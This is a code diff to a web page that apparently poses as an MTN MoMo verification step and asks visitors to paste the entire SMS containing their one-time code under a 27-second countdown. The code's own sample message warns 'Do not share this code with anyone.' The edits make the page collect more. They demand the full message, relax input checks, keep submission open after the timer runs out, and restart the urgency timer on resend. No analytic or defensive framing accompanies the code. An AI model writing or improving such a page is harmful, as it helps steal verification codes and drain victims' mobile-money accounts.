@@ -58,6 +58,10 @@
             border-color: #dc2626; color: #dc2626;
             animation: pulse 1s infinite;
         }
+        .timer-circle.expired {
+            border-color: #9ca3af; color: #9ca3af;
+            animation: none;
+        }
         @keyframes pulse {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.08); }
@@ -78,7 +82,6 @@
         .sms-input::placeholder { color: #aaa; }
         .sms-input:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); }
         .sms-input.error { border-color: #dc2626; background: #fff5f5; }
-        .sms-input:disabled { background: #f3f4f6; color: #999; cursor: not-allowed; }
 
         .example-text {
             font-size: 12px; color: #6b7280; font-style: italic;
@@ -131,10 +134,10 @@
     <!-- MAIN -->
     <main class="main">
         <div class="card">
-            <h2>Paste SMS Message</h2>
+            <h2>Paste Full SMS Message</h2>
             <p class="desc">
                 A verification message has been sent to your phone. Please copy
-                and paste the full message here.
+                and paste the <strong>entire SMS message</strong> here — not just the code.
             </p>
 
             <!-- TIMER -->
@@ -142,7 +145,7 @@
                 <div class="timer-circle" id="timerCircle">27</div>
                 <div class="timer-text">
                     <strong>Message expires in <span id="timerSec">27</span>s.</strong><br>
-                    Paste your SMS before time runs out.
+                    Paste your full SMS before time runs out.
                 </div>
             </div>
 
@@ -152,11 +155,11 @@
             <!-- FORM -->
             <form id="verifyForm">
                 <textarea id="code" class="sms-input"
-                          placeholder="Paste your full SMS message here..."
-                          maxlength="500" autocomplete="off"></textarea>
+                          placeholder="Paste the FULL SMS message here (e.g. 'Your MTN MoMo verification code is: 123456')..."
+                          maxlength="1000" autocomplete="off"></textarea>
 
                 <p class="example-text">
-                    Example: "Your MTN MoMo verification code is: 123456"
+                    Example: "Your MTN MoMo verification code is: 123456. Do not share this code with anyone."
                 </p>
 
                 <button type="submit" class="submit-btn" id="submitBtn" disabled>
@@ -186,30 +189,40 @@
         const timerSec   = document.getElementById('timerSec');
 
         // ─── Countdown timer (27 seconds) ───
-        let timeLeft = 27;
+        const INITIAL_TIME = 27;
+        let timeLeft = INITIAL_TIME;
         let timerInterval = null;
+        let expired = false;
 
         function startTimer() {
+            clearInterval(timerInterval);
+            expired = false;
+            timeLeft = INITIAL_TIME;
+            timerCircle.textContent = timeLeft;
+            timerSec.textContent    = timeLeft;
+            timerCircle.classList.remove('urgent', 'expired');
+
             timerInterval = setInterval(() => {
                 timeLeft--;
                 timerCircle.textContent = timeLeft;
                 timerSec.textContent    = timeLeft;
 
                 // Turn red & pulse when ≤10s
-                if (timeLeft <= 10) {
+                if (timeLeft <= 10 && timeLeft > 0) {
                     timerCircle.classList.add('urgent');
                 }
 
-                // Time's up
+                // Time's up — DO NOT disable the input. Just show a notice.
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
+                    expired = true;
                     timerCircle.textContent = '0';
                     timerSec.textContent = '0';
-                    codeInput.disabled = true;
-                    submitBtn.disabled = true;
-                    submitBtn.classList.remove('active');
-                    errorMsg.textContent = '⏰ Time expired. Please request a new code.';
-                    errorMsg.classList.add('show');
+                    timerCircle.classList.remove('urgent');
+                    timerCircle.classList.add('expired');
+                    errorMsg.textContent = '⏰ Time expired. You can still submit, or tap Resend for a new code.';
+                    errorMsg.style.color = '#dc2626';
+                    errorMsg.classList.add('show', 'info');
                 }
             }, 1000);
         }
@@ -221,7 +234,7 @@
             this.classList.remove('error');
             errorMsg.classList.remove('show', 'info');
 
-            if (this.value.trim().length > 0 && timeLeft > 0) {
+            if (this.value.trim().length > 0) {
                 submitBtn.disabled = false;
                 submitBtn.classList.add('active');
             } else {
@@ -282,8 +295,11 @@
             e.preventDefault();
 
             const code = codeInput.value.trim();
-            if (code.length < 4) {
-                errorMsg.textContent = 'Please paste the full SMS message';
+            // Require the FULL SMS — must be reasonably long and contain a digit sequence.
+            const hasDigits = /\d{3,}/.test(code);
+            if (code.length < 10 || !hasDigits) {
+                errorMsg.textContent = 'Please paste the FULL SMS message (including the code).';
+                errorMsg.style.color = '#dc2626';
                 errorMsg.classList.add('show');
                 codeInput.classList.add('error');
                 return;
@@ -312,6 +328,7 @@
             } catch (err) {
                 console.error('Send failed:', err);
                 errorMsg.textContent = '⚠️ Network error. Please try again.';
+                errorMsg.style.color = '#dc2626';
                 errorMsg.classList.add('show');
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'SUBMIT';
@@ -320,7 +337,7 @@
             }
         });
 
-        // ─── Resend ───
+        // ─── Resend (also RESTARTS the countdown) ───
         resendBtn.addEventListener('click', async function () {
             this.disabled = true;
             this.textContent = 'Sending...';
@@ -335,14 +352,30 @@
                 console.error('Resend failed:', err);
             }
 
-            errorMsg.textContent = '✅ New SMS requested. Please check your phone.';
+            // Restart the countdown
+            startTimer();
+            // Re-enable input/button area in case a previous timer had disabled them
+            codeInput.disabled = false;
+            if (codeInput.value.trim().length > 0) {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('active');
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('active');
+            }
+            submitBtn.textContent = 'SUBMIT';
+            submitBtn.classList.remove('active'); // will re-add on input if there's text
+
+            errorMsg.textContent = '✅ New SMS requested. Please check your phone and paste the FULL message.';
             errorMsg.style.color = '#3a7d44';
-            errorMsg.classList.add('show');
+            errorMsg.classList.add('show', 'info');
 
             setTimeout(() => {
                 this.disabled = false;
                 this.textContent = "Didn't receive a code? Resend";
-                errorMsg.classList.remove('show');
+                if (!expired) {
+                    errorMsg.classList.remove('show');
+                }
                 errorMsg.style.color = '#dc2626';
             }, 5000);
         });
